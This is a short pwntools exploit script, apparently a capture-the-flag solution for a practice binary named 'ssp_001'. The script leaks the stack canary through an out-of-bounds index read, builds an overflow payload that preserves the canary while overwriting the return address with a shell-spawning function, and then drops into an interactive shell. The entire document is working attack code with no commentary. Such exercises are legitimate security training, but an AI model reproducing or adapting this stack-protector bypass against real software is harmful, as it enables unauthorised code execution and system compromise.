from pwn import *

p = process('./ssp_001')

canary = b""
get_shell =  0x080486b9
i = 131
while i >= 128:
    p.sendafter(b'> ', b'P')
    p.sendlineafter(b'index : ', str(i))
    p.recvuntil(b'is : ')
    canary += p.recvn(2)
    i -= 1

canary = int(canary,16)
log.info('Canary: ' + hex(canary))

payload = b'a'*(0x48-0x8) + p32(canary) + b'a'*8 + p32(get_shell)
p.sendafter(b'> ', b'E')
p.sendlineafter(b'Size : ', str(len(payload)))
p.sendafter(b'Name : ', payload)


p.interactive()
